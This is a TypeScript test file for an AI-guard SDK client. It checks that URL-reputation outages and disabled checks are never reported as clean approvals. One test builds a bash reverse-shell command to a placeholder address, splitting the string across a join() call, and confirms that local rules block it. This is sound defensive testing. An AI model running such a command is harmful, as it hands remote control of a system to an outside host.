import { afterEach, describe, expect, it, vi } from "vitest";

// Real core, with the installed-config read observable so a test can set
// `url_check.unchecked_action` the way an operator would.
const installed = vi.hoisted(() => ({ uncheckedAction: undefined as "allow" | "ask" | undefined }));
vi.mock("@singularityrd/aidr-core", async (importOriginal) => {
	const core = await importOriginal<typeof import("@singularityrd/aidr-core")>();
	return {
		...core,
		loadConfig: async (...args: Parameters<typeof core.loadConfig>) => {
			const config = await core.loadConfig(...args);
			if (!installed.uncheckedAction || core.isInvalidConfig(config)) return config;
			return {
				...config,
				url_check: { ...config.url_check, unchecked_action: installed.uncheckedAction },
			};
		},
	};
});

import { AIDRClient } from "../client.js";
import { type SDKConfig, SDKConfigSchema } from "../config.js";

/**
 * A reputation outage must never be reported as a clean URL.
 *
 * `_performCheck` used to catch every `checkUrls` failure, log it and carry on
 * with an empty result list, so "the reputation leg is broken" and "the URL was
 * checked and is clean" produced the same approval. These tests pin the
 * distinction: an unavailable leg becomes an indeterminate, non-approving
 * result, while a completed check that found nothing stays exactly as it was.
 */
const config: SDKConfig = {
	apiKey: "test-key",
	timeout: 5000,
	retries: 0,
	cache: false,
	cacheTtl: 300000,
	environment: "production",
	urlReputationEnabled: true,
	urlReputationUncheckedAction: "allow",
	includeUrlQueryParameters: false,
};

interface InternalClient {
	initialized: boolean;
	init: () => Promise<void>;
	urlClient: { checkUrls: (urls: string[]) => Promise<unknown[]> };
}

function readyClient(checkUrls: InternalClient["urlClient"]["checkUrls"]): AIDRClient {
	const client = new AIDRClient(config);
	const internal = client as unknown as InternalClient;
	internal.initialized = true;
	internal.init = async () => {};
	internal.urlClient = { checkUrls };
	return client;
}

describe("SDK reputation availability", () => {
	afterEach(() => {
		installed.uncheckedAction = undefined;
	});

	function disabledClient(overrides: Partial<SDKConfig> = {}) {
		const client = new AIDRClient({ ...config, urlReputationEnabled: false, ...overrides });
		const internal = client as unknown as InternalClient;
		internal.initialized = true;
		internal.init = async () => {};
		const checkUrls = vi.fn(async () => []);
		internal.urlClient = { checkUrls };
		return { client, checkUrls };
	}

	it("allows a benign fetch by default when reputation is not enabled, labelled not-checked", async () => {
		const { client, checkUrls } = disabledClient();

		const result = await client.check({
			action: "fetch",
			resource: "https://example.com/private?token=secret",
		});

		expect(checkUrls).not.toHaveBeenCalled();
		expect(result.decision).toBe("allow");
		expect(result.allowed).toBe(true);
		// Never presented as clean: the category and reason say it was not checked.
		expect(result.metadata?.category).toBe("reputation_not_checked");
		expect(result.metadata?.leg).toBe("url_reputation");
		expect(result.metadata?.indeterminate).toBeUndefined();
		expect(result.reason).toContain("Not checked by a reputation service");
		expect(result.reason).toContain("url_check is not enabled");
		expect(result.reason).toContain("this is not a clean reputation result");
		// The secret-bearing URL is not echoed into the human-readable reason.
		expect(result.reason).not.toContain("token=secret");
	});

	it("keeps a local rule hit blocking while reputation is not enabled", async () => {
		// Real rules (no init stub): the not-checked default must never soften a hit.
		const client = new AIDRClient({ ...config, urlReputationEnabled: false });
		await client.init();
		const shell = ["bash -i >& /dev/", "tcp/203.0.113.7/4444 0>&1"].join("");
		const result = await client.check({
			action: "fetch",
			resource: "https://example.com/hook",
			context: { body: { command: shell } },
		});

		expect(result.allowed).toBe(false);
		expect(result.decision).not.toBe("allow");
		expect(result.metadata?.category).not.toBe("reputation_not_checked");
	});

	it("allows the benign twin with real rules loaded", async () => {
		const client = new AIDRClient({ ...config, urlReputationEnabled: false });
		await client.init();
		const result = await client.check({
			action: "fetch",
			resource: "https://docs.python.org/3/",
			context: { body: { command: "echo hello" } },
		});

		expect(result.decision).toBe("allow");
		expect(result.metadata?.category).toBe("reputation_not_checked");
	});

	it("restores hold-for-review with urlReputationUncheckedAction: ask", async () => {
		const { client, checkUrls } = disabledClient({ urlReputationUncheckedAction: "ask" });

		const result = await client.check({
			action: "fetch",
			resource: "https://example.com/private?token=secret",
		});

		expect(checkUrls).not.toHaveBeenCalled();
		expect(result.decision).toBe("ask");
		expect(result.allowed).toBe(false);
		expect(result.metadata?.indeterminate).toBe(true);
		expect(result.metadata?.leg).toBe("url_reputation");
		expect(result.reason).toContain("disabled to avoid sending URLs");
	});

	it("honours an installed url_check.unchecked_action: ask", async () => {
		installed.uncheckedAction = "ask";
		const { client, checkUrls } = disabledClient();

		const result = await client.check({ action: "fetch", resource: "https://example.com/a" });

		expect(checkUrls).not.toHaveBeenCalled();
		expect(result.decision).toBe("ask");
		expect(result.metadata?.indeterminate).toBe(true);
		expect(result.metadata?.category).toBeUndefined();
	});

	it("defaults urlReputationUncheckedAction to allow and rejects unknown values", () => {
		expect(SDKConfigSchema.parse({}).urlReputationUncheckedAction).toBe("allow");
		expect(() => SDKConfigSchema.parse({ urlReputationUncheckedAction: "deny" })).toThrow();
	});

	it("surfaces a url_reputation outage instead of reporting an empty clean result", async () => {
		const client = readyClient(async () => {
			throw new Error("url_reputation leg unavailable");
		});

		const result = await client.check({
			action: "fetch",
			resource: "https://example.com/payload",
		});

		expect(result.allowed).toBe(false);
		expect(result.decision).toBe("ask");
		expect(result.metadata?.indeterminate).toBe(true);
		expect(result.metadata?.leg).toBe("url_reputation");
		expect(result.reason).toContain("was NOT verified");
	});

	it("returns exactly what it returned before when the check completed", async () => {
		const client = readyClient(async () => []);

		const result = await client.check({
			action: "fetch",
			resource: "https://example.com/benign",
		});

		expect(result.decision).toBe("allow");
		expect(result.allowed).toBe(true);
		expect(result.metadata?.indeterminate).toBeUndefined();
	});

	it("keeps a non-fetch action independent of the reputation leg", async () => {
		const checkUrls = vi.fn(async () => []);
		const client = readyClient(checkUrls);

		const result = await client.check({ action: "execute", resource: "echo hello" });

		expect(checkUrls).not.toHaveBeenCalled();
		expect(result.metadata?.indeterminate).toBeUndefined();
	});

	it("opts into provider checks explicitly", async () => {
		const client = new AIDRClient({ ...config, urlReputationEnabled: true });
		const internal = client as unknown as InternalClient;
		internal.initialized = true;
		internal.init = async () => {};
		const checkUrls = vi.fn(async () => []);
		internal.urlClient = { checkUrls };

		await client.check({ action: "fetch", resource: "https://example.com/path" });

		expect(checkUrls).toHaveBeenCalledWith(["https://example.com/path"]);
	});
});
